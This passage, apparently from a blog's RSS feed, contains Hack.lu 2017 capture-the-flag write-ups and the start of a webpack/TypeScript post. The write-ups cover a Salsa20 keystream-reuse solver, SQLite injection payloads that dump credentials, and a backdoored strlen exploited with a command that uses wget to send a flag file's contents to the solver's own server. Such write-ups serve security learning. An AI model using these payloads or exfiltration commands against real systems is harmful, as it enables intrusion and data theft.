+A = 1026312539297800437474663698165859314949881437729617621666434357798219198741950468733395500361477359726152747087790103309627020498122003777642051150130697457594304849673838709900017711265818285080832347734747895550397950729716624922572654209637755195129162139245110756558638081495998280747642920484467428206475906559638681536868548289456924005274209311355030582255692087426910634838198143851507435754029135363794578075936092774722678311786272841489629294721103591751528609388061794369341067986401129462942050916582521451289187645626081017578576190303952351748434876686541368607656026867091583868645619423975306245327421218767449273192101105293424028461698783545171866070124432565063559495566733441286372612161876492134408160732339966921175762866198980795890946054558528891296203285979664329713156129091098226212735763844909789916934266711879564086741733061623347281499025678164709559814150194881622611023214199434022258730549350019749882889143749385314934896284396513061241138504029046053964944026179039768718830854958634216721133676746317913559932277050177463811150719675119168868527853864167729206220819613297736800799391257602899169041109002518019207734013899840092155297682096290489330476118066934735827328128343402508975429994312
+
+m = 626538023179183383530326775878874061243537575637678230775990839517480703838547661223043351239918394865532739593994849154430591305198322288328417436892902443505917379006443598061697092201021536603987285163299838045075649512028921956548205676208712226470308113290505059049053554206416767772651512039632936795232724801922443388952796545084060280910673215063573749033668717290815841834685051547255093401042248880082370281195663905731764841136214458769095907569163184276786105979509363239839613385785232307550226120692268670717158539363476974302593377514937470953649913863219081380729197866499068054753726732556988368232198510160183731571741889761632557457157261911256679728707526809880224074940827825962124087677609578885077944156589121586951372962667391498824853627326311588259929756093569512874696625507873168095797130866697040006079191565592914811736694534863664544646201900855732710994613768016495896341014229622129847800138058041138449691835652916517559125407914079964177419733079221280850917496784527992741048638603428068452948455069671414667008770873913118369984179054902139270844669700487715140145038503768704763641223894377872853332484296603268546135216483844722413025955229649646292980986542646384960063297213437076185709400450
+
+def xgcd(b, n):
+  x0, x1, y0, y1 = 1, 0, 0, 1
+  while n != 0:
+    q, b, n = b // n, n, b % n
+    x0, x1 = x1, x0 - q * x1
+    y0, y1 = y1, y0 - q * y1
+  return  b, x0, y0
+
+ainv = xgcd(A, p)[1]
+print (A*ainv % p)
+print (p - B)
+
+assert(pow(g, (p-1)/2, p) == p-1)
+
+d = (p-1)/2
+m = m * pow(ainv, d, p) % p
+
+print hex(m)[2:-1].decode("hex")</pre>
+<div class="su-box su-box-style-default" style="border-color:#afcac9;border-radius:3px"><div class="su-box-title" style="background-color:#dbfcfb;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">INFO</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">flag{If you whistle while you&#8217;re pissing, you have two minds, where one is quite sufficient. If you have two minds, you are at war with yourself. If you are at war with yourself, it is easy for an external force to defeat you. This is why Mong-tse wrote. &#8216;A man must destroy himself before others can destroy him.&#8217; | Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamaco laboris nisi &#8230;} </div></div>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) salsa - by SLAZ - 200 (+ 15)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>The Flat Earth Society has a secret information storage. There is enough evidence in it, to convince every member of them, that the earth is round. Unfortunately, we don’t have the key &#8230;<br />
+nc flatearth.fluxfingers.net 1721</p>
+<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/salsa-f6bf6552c473066ddbe2ebdf0634c5b5.zip">Download</a></p>
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>This problem provide an encryption named salsa20, send the message with flag encrypted, and allow us to encrypt 8192 bytes of data.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">KEY = os.urandom(32)
+
+class TCPHandler(asyncore.dispatcher_with_send):
+
+    def __init__(self, socket):
+        asyncore.dispatcher_with_send.__init__(self, socket)
+        self.Nonce = os.urandom(8)
+        self.MsgCounter = 0
+        self.sendMessage("Hello my dear friend, the flag is %s!" % FLAG)
+
+    def sendMessage(self, data):
+        text = base64.b64encode(data)
+        for i in range(0, len(text), 128):
+            msg = {"cnt" : self.MsgCounter, "data" : text[i: i+128]}
+            msgtext = json.dumps(msg)
+            encdata = salsa20.s20_crypt(KEY, self.Nonce, self.MsgCounter, msgtext)
+            self.MsgCounter += 1
+            self.send(encdata)
+
+    def handle_read(self):
+        data = self.recv(8192)
+        if data:
+            self.sendMessage(data)</pre>
+<p>Bellowing is the main implementation of the encryption:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">def s20_crypt(key, nonce, si, data):
+    key = [ord(c) for c in key]
+    nonce = [ord(c) for c in nonce]
+    
+    n = [0] * 16
+
+    for i in range(8):
+        n[i] = nonce[i]
+
+    if (si % 64) != 0:
+        b0, b1, b2, b3 = s20_rev_littleendian(si / 64)
+        n[8] = b0
+        n[9] = b1
+        n[10] = b2
+        n[11] = b3
+
+        keystream = s20_expand32(key, n)
+        print "x", ''.join(map(chr, keystream)).encode("hex")
+
+    outp = ""
+
+    for i, c in enumerate(data):
+        if ((si+i) % 64) == 0:
+            b0, b1, b2, b3 = s20_rev_littleendian((si+i) / 64)
+            n[8] = b0
+            n[9] = b1
+            n[10] = b2
+            n[11] = b3
+
+            keystream = s20_expand32(key, n)
+            print "y", ''.join(map(chr, keystream)).encode("hex")
+
+        outp += chr(ord(c) ^ keystream[(si+i) % 64])
+
+    return outp</pre>
+<p>It clearly shows us that this encryption is just xor the input buffer with a keystrem, and that <code>keystream</code> is shifted by one for each new cryption (controlled by <code>si</code>).</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">C1 = M1 xor Keystream1
+C2 = M2 xor Keystream2
+Keystream2 = Keystream1[1:]</pre>
+<p>So,</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">M1[1:] = C1[1:] xor Keystream1[1:]
+       = C1[1:] xor Keystream2
+       = C1[1:] xor C2 xor M2</pre>
+<p>That&#8217;s enough to code the solver:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python                                                               
+import struct                                                                   
+import socket                                                                   
+import telnetlib                                                                
+import sys, time                                                           
+import string, base64, json
+import re
+import salsa20
+
+def sxor(s1,s2):    
+  return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))
+
+def recv_utils(s,r,ss):
+  while all([not(sss in r) for sss in ss]):
+    sa = s.recv(4096)
+    #print sa
+    r += sa
+  return r
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+s.connect(('flatearth.fluxfingers.net', 1721))
+
+keybuf = s.recv(4096)
+
+print len(keybuf), keybuf.encode('hex')
+
+s.send('\x00' * 8192)
+abuf = ''
+while len(abuf) &lt; 8192:
+  abuf += s.recv(409600)
+
+print abuf.encode('hex')
+
+msg = {"cnt" : 1, "data" : "A"*128}
+msgtext = json.dumps(msg)
+print sxor(sxor(keybuf[1:], abuf[:]), msgtext)
+
+#kk = "AAAAAAAAAAAAAAAAAAAAAAA" * 10
+#encdata1 = salsa20.s20_crypt("\xBB"*32, "\xAA"*8, 0, "hello world | xyz | abc" * 10)
+#encdata2 = salsa20.s20_crypt("\xBB"*32, "\xAA"*8, 2, kk)
+#
+#print '-', len(encdata1), encdata1.encode('hex')
+#
+#print sxor(sxor(encdata1[2:], encdata2[:]), kk)</pre>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Web, Pwn) Indianer - by hasiH451 - 200 (+ 36)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>Try to enter this <a href="https://indianer.flatearth.fluxfingers.net/">Tipi</a></p>
+<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/indianer-f7d59dea1f5314f2ddd2d9bd401a996c.zip">Download</a></p>
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>The archive provide us a shared file <code>backdoor.so</code>, which override <code>strlen</code> function:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">__int64 __fastcall strlen(const char *s_1)
+{
+  size_t slen; // rsi
+  __int64 result; // rax
+  char *shell_buf; // rax
+  signed int i; // [rsp+1Ch] [rbp-134h]
+  __int64 (__fastcall *old_strlen)(const char *, const char *); // [rsp+20h] [rbp-130h]
+  char *v6; // [rsp+28h] [rbp-128h]
+  char *v7; // [rsp+30h] [rbp-120h]
+  char *s; // [rsp+38h] [rbp-118h]
+  char *sa; // [rsp+38h] [rbp-118h]
+  char needle[256]; // [rsp+40h] [rbp-110h]
+  char v11; // [rsp+140h] [rbp-10h]
+  unsigned __int64 v12; // [rsp+148h] [rbp-8h]
+
+  v12 = __readfsqword(0x28u);
+  old_strlen = (__int64 (__fastcall *)(const char *, const char *))dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "strlen");
+  if ( !strcmp("GET", s_1) )
+    ++trigger;
+  slen = (size_t)"ndex.html";
+  v7 = strstr(s_1, "ndex.html");
+  if ( v7 &amp;&amp; apr_hook_debug_enabled )
+  {
+    apr_hook_debug_enabled &gt;&gt;= 8;
+    *(v7 - 1) += apr_hook_debug_enabled;
+    apr_hook_debug_enabled = 0;
+    counter = 0;
+    result = old_strlen(s_1, "ndex.html");
+  }
+  else
+  {
+    memset(needle, 0, sizeof(needle));
+    v11 = 0;
+    for ( i = 0; i &lt;= 511; i += 9 )
+    {
+      slen = (unsigned int)(((g_idx[0] &amp; 1) + i) % 24 + 'a');
+      needle[i % 35] = ((g_idx[0] &amp; 1) + i) % 24 + 'a';
+    }
+    needle[g_idx[0]] = 0;
+    if ( trigger &amp; 1 )
+    {
+      ++g_idx[0];
+      if ( counter &lt;= 1 )
+        ++counter;
+      if ( g_idx[0] &gt; 1u )
+      {
+        slen = old_strlen(s_1, (const char *)slen);
+        s = (char *)memmem(s_1, slen, needle, 34uLL);
+        if ( s )
+        {
+          *s = 0;
+          shell_buf = &amp;s[strlen(needle)];
+          sa = shell_buf + 1;
+          if ( *shell_buf == '=' )
+          {
+            while ( 1 )
+            {
+              slen = '_';
+              v6 = strchr(sa, '_');
+              if ( !v6 )
+                break;
+              *v6 = ' ';
+            }
+            apr_hook_debug_enabled = system(sa);
+          }
+        }
+      }
+    }
+    if ( counter &gt; 1 )
+      counter = 0;
+    result = old_strlen(s_1, (const char *)slen);
+  }
+  return result;
+}</pre>
+<p>So we can trigger the backdoor by first including <code>ndex.html</code> in the url, in order to execute <code>apr_hook_debug_enabled = system(sa);</code> line, all the parent if must be satisfied:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">if ( trigger &amp; 1 )</pre>
+<p><code>trigger</code> is an increasing number, so this will trigger once every 2 requests.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">if ( g_idx[0] &gt; 1u )</pre>
+<p><code>g_idx[0]</code> is also an increasing number whenever the first if is satisfied.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">slen = old_strlen(s_1, (const char *)slen);
+s = (char *)memmem(s_1, slen, needle, 34uLL);
+if ( s )</pre>
+<p>so it will search for all 34 bytes of needle,</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">if ( *shell_buf == '=' )</pre>
+<p>check if that buffer continues with <code>=</code>,</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">while ( 1 )
+{
+  slen = '_';
+  v6 = strchr(sa, '_');
+  if ( !v6 )
+    break;
+  *v6 = ' ';
+}
+apr_hook_debug_enabled = system(sa);</pre>
+<p>replace all <code>_</code> with space <span style="color: #222222; font-family: monospace;"><span style="background-color: #e9ebec;"> </span></span> and then execute that buffer.</p>
+<p>So let&#8217;s calculate the needle at that state:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">#include &lt;iostream&gt;
+
+using namespace std;
+int main(int argc, char *argv[]) {
+  char needle[256];
+  char g_idx[1] = {35};
+  memset(needle, 0, sizeof(needle));
+  for (int i = 0; i &lt;= 511; i += 9 )
+  {
+    needle[i % 35] = ((g_idx[0] &amp; 1) + i) % 24 + 97;
+  }
+  needle[g_idx[0]] = 0;
+  cout &lt;&lt; needle &lt;&lt; endl;
+}</pre>
+<p>Which give us</p>
+<div class="su-box su-box-style-default" style="border-color:#000000;border-radius:3px"><div class="su-box-title" style="background-color:#000000;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">needle</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">eqeqeqbnbnbnbnbkwkwkwkwhththththqeq</div></div>
+<p>And then finally we can start <code>netcat</code> on our server and use wget to send commands output to our server:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">file_get_contents('https://indianer.flatearth.fluxfingers.net/ndex.html');
+for($i=0;$i&lt;40;$i++) {
+  echo file_get_contents('https://indianer.flatearth.fluxfingers.net/eqeqeqbnbnbnbnbkwkwkwkwhththththqeq=wget_http://$server:$port/`'.str_replace(' ','_','cat /var/www/flag.txt').'`');
+}</pre>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Misc, Web) flatscience - by Staubfinger - 100 (+ 90)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>The Professor on Flat Earth is Prof. Flux Horst. Only for bragging he made his own Blog showcasing his favorite Papers. Beeing the only Professor, he thinks he is the smartest Person arround the Plate. Can you proof him wrong and log into his Admin-Panel?<br />
+<a href="https://flatscience.flatearth.fluxfingers.net/">Link</a></p>
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p><code>robots.txt</code> provides us:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">User-agent: *
+Disallow: /login.php
+Disallow: /admin.php
+</pre>
+<p>The login.php source contain:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</pre>
+<p>So let&#8217;s try appending ?debug to that file, which show us the source code:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+blockquote { background: #eeeeee; }
+h1 { border-bottom: solid black 2px; }
+h2 { border-bottom: solid black 1px; }
+.comment { color: darkgreen; }
+&lt;/style&gt;
+
+&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+
+&lt;div align=right class=lastmod&gt;
+Last Modified: Fri Mar  31:33:7 UTC 1337
+&lt;/div&gt;
+
+&lt;h1&gt;Login&lt;/h1&gt;
+
+Login Page, do not try to hax here plox!&lt;br&gt;
+
+
+&lt;form method="post"&gt;
+  ID:&lt;br&gt;
+  &lt;input type="text" name="usr"&gt;
+  &lt;br&gt;
+  Password:&lt;br&gt; 
+  &lt;input type="text" name="pw"&gt;
+  &lt;br&gt;&lt;br&gt;
+  &lt;input type="submit" value="Submit"&gt;
+&lt;/form&gt;
+
+&lt;?php
+if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw'])){
+        $user = $_POST['usr'];
+        $pass = $_POST['pw'];
+
+        $db = new SQLite3('../fancy.db');
+
+        $res = $db-&gt;query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
+    if($res){
+        $row = $res-&gt;fetchArray();
+    }
+    else{
+        echo "&lt;br&gt;Some Error occourred!";
+    }
+
+        if(isset($row['id'])){
+                setcookie('name',' '.$row['name'], time() + 60, '/');
+                header("Location: /");
+                die();
+        }
+
+}
+
+if(isset($_GET['debug']))
+highlight_file('login.php');
+?&gt;
+&lt;!-- TODO: Remove ?debug-Parameter! --&gt;
+</pre>
+<p>That&#8217;s clearly sqlite injection, we can obtain the schema by</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">usr=' union select 1,(select sql from sqlite_master limit 1)--&amp;pw=</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="sql">CREATE TABLE Users(
+id int primary key,
+name varchar(255),
+password varchar(255),
+hint varchar(255)
+)</pre>
+<p>And then the admin record:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&amp;pw=</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">1; admin; 3fab54a50e770d830c0416df817567662a9dc85c; my fav word in my fav paper?!</pre>
+<p>So just scrape all the pdfs and look for the password</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">foreach(glob("pdfs/*.pdf") as $pdf){
+  passthru("pdftotext $pdf");
+  $txt = file_get_contents(substr($pdf, 0, -4) . ".txt");
+  preg_match_all("@[^\n\r\t\s]+@", $txt, $m);
+  foreach($m[0] as $l) {
+    if (sha1($l."Salz!")=="3fab54a50e770d830c0416df817567662a9dc85c") {
+      die($l);
+    }
+  }
+}
+</pre>
+<p>Password is <code>ThinJerboa</code>, logging into admin.php give us the flag:</p>
+<div class="su-box su-box-style-default" style="border-color:#000000;border-radius:3px"><div class="su-box-title" style="background-color:#000000;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">FLAG</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}</div></div>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Rev) The Maya Society - by bykunte_ - 50 (+ 91)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
+<p>Maya society was broken into a class structure with four main levels: the nobility (Maya almehenob), the priesthood (Maya ahkinob), the common people (Maya ah chembal uinieol), and the slaves (Maya ppencatob). The most powerful of the ruling elite was known as the halach uinic. The halach uinic are alive and still secretly hold meetings today. You have to reverse engineer their communication and infiltrate the ruling elite. <a href="https://maya.flatearth.fluxfingers.net/">Link</a></p>
+</div></div>
+<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
+<p>The webpage has a download button which provide a <code>launcher</code> file:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ file launcher
+launcher: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=464269c36073a8820e69146b00cc8e68d1f50718, stripped</pre>
+<p>loading with IDA give us</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  size_t v3; // rbx
+  size_t v4; // rax
+  size_t v6; // rax
+  size_t v7; // rax
+  __int64 v8; // rdi
+  time_t timer; // [rsp+18h] [rbp-128h]
+  char v10[8]; // [rsp+20h] [rbp-120h]
+  char src; // [rsp+40h] [rbp-100h]
+  char s; // [rsp+60h] [rbp-E0h]
+  __int64 v13; // [rsp+C8h] [rbp-78h]
+  char v14; // [rsp+D4h] [rbp-6Ch]
+  char v15; // [rsp+DDh] [rbp-63h]
+  char v16; // [rsp+E6h] [rbp-5Ah]
+  char v17; // [rsp+EFh] [rbp-51h]
+  void (__cdecl *v18)(__int64); // [rsp+F8h] [rbp-48h]
+  __int64 v19; // [rsp+100h] [rbp-40h]
+  char *v20; // [rsp+108h] [rbp-38h]
+  char *dest; // [rsp+110h] [rbp-30h]
+  int *v22; // [rsp+118h] [rbp-28h]
+  size_t v23; // [rsp+120h] [rbp-20h]
+  struct tm *tp; // [rsp+128h] [rbp-18h]
+
+  strcpy(v10, ".fluxfingers.net");
+  timer = time(0LL);
+  tp = localtime(&amp;timer);
+  strftime(&amp;s, 0x63uLL, "%Y-%m-%d", tp);
+  v23 = strlen(&amp;s);
+  sub_B5A(&amp;s, v23);
+  v22 = &amp;dword_2030B8;
+  snprintf(
+    &amp;v17,
+    9uLL,
+    "%02x%02x%02x%02x",
+    (unsigned __int8)dword_2030B8,
+    BYTE1(dword_2030B8),
+    BYTE2(dword_2030B8),
+    HIBYTE(dword_2030B8));
+  v22 = &amp;dword_2030C0;
+  snprintf(
+    &amp;v16,
+    9uLL,
+    "%02x%02x%02x%02x",
+    (unsigned __int8)dword_2030C0,
+    BYTE1(dword_2030C0),
+    BYTE2(dword_2030C0),
+    HIBYTE(dword_2030C0));
+  v22 = &amp;dword_2030B4;
+  snprintf(
+    &amp;v15,
+    9uLL,
+    "%02x%02x%02x%02x",
+    (unsigned __int8)dword_2030B4,
+    BYTE1(dword_2030B4),
+    BYTE2(dword_2030B4),
+    HIBYTE(dword_2030B4));
+  v22 = &amp;dword_2030BC;
+  snprintf(
+    &amp;v14,
+    9uLL,
+    "%02x%02x%02x%02x",
+    (unsigned __int8)dword_2030BC,
+    BYTE1(dword_2030BC),
+    BYTE2(dword_2030BC),
+    HIBYTE(dword_2030BC));
+  snprintf(&amp;src, 0x21uLL, "%s%s%s%s", &amp;v17, &amp;v16, &amp;v15, &amp;v14);
+  v3 = strlen(&amp;src);
+  v4 = strlen(v10);
+  dest = (char *)malloc(v3 + v4 + 1);
+  if ( !dest )
+    return 1LL;
+  *dest = 0;
+  strcat(dest, &amp;src);
+  strcat(dest, v10);
+  v20 = (char *)sub_18A4(dest, v10);
+  if ( !v20 )
+    return 1LL;
+  v6 = strlen(v20);
+  v19 = sub_15E0(v20, v6, &amp;v13);
+  v7 = strlen(v20);
+  v18 = (void (__cdecl *)(__int64))sub_15E0(v20, v7, &amp;v13);
+  if ( !v19 )
+    return 1LL;
+  v8 = v19;
+  sub_1858(v19, v13, v18);
+  v18(v8);
+  return 0LL;
+}</pre>
+<p>So this main file will do something starting from a string which create from current date, the original webpage contains <code>© 2012</code> which hint us that this webpage is <em>created</em> in 2012, so i create a simple C file to use with LD_PRELOAD to fake the time:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+int time(int) {
+  return atoi(getenv("CURR_TIME"));
+}</pre>
+<p>and then just try every timestamp starting from 2012-01-01 will give us the password @ 2012-12-21:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ CURR_TIME=1356066000 LD_PRELOAD=$(pwd)/fake.so ./launcher
+flag{e3a03c6f3fe91b40eaa8e71b41f0db12}
+</pre>
+</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2017/10/19/hack-lu-2017/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">126</post-id>	</item>
+		<item>
+		<title>Vue single file component and typescript</title>
+		<link>https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/#respond</comments>
+		<pubDate>Wed, 12 Jul 2017 16:18:04 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[Trick]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=116</guid>
+		<description><![CDATA[Webpack configuration, module.rules: { test: /\.ts$/, include: projectRoot, exclude: /node_modules/, use: [ { loader: 'ts-loader', options: { appendTsSuffixTo: [/\.vue$/], }, }, ], }, { test: /\.tsx$/, include: projectRoot, exclude: /node_modules/, use: [ _.babelLoader, { loader:<a class="read-more" href="https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/">Continue reading</a>]]></description>
+				<content:encoded><![CDATA[<p>Webpack configuration, <code class="EnlighterJSRAW" data-enlighter-language="js">module.rules</code>:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">{
+    test: /\.ts$/,
+    include: projectRoot,
+    exclude: /node_modules/,
+    use: [
+        {
+            loader: 'ts-loader',
+            options: {
+                appendTsSuffixTo: [/\.vue$/],
+            },
+        },
+    ],
+},
+{
+    test: /\.tsx$/,
+    include: projectRoot,
+    exclude: /node_modules/,
+    use: [
+        _.babelLoader,
+        {
+            loader: 'ts-loader',
+            options: {
+                appendTsSuffixTo: [/\.vue$/],
+            },
+        },
+    ],
+},
+</pre>
+<p>Intellij Idea language injection for typescript block:</p>
+<p><a href="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?ssl=1"><img data-attachment-id="119" data-permalink="https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/screen-shot-2017-07-12-at-11-12-55-pm/" data-orig-file="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?fit=460%2C431&amp;ssl=1" data-orig-size="460,431" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2017-07-12 at 11.12.55 PM" data-image-description="" data-medium-file="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?fit=300%2C281&amp;ssl=1" data-large-file="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?fit=460%2C431&amp;ssl=1" class="alignnone size-medium wp-image-119" src="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?resize=300%2C281&#038;ssl=1" alt="" width="300" height="281" srcset="https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?resize=300%2C281&amp;ssl=1 300w, https://i2.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.12.55-PM.png?w=460&amp;ssl=1 460w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a> <a href="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?ssl=1"><img data-attachment-id="120" data-permalink="https://www.vhn.vn/blog/index.php/2017/07/12/vue-single-file-component-and-typescript/screen-shot-2017-07-12-at-11-13-18-pm/" data-orig-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2017/07/Screen-Shot-2017-07-12-at-11.13.18-PM.png?fit=459%2C430&amp;ssl=1" data-orig-size="459,430" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2017-07-12 at 11.13.18 PM" data-image-description="" 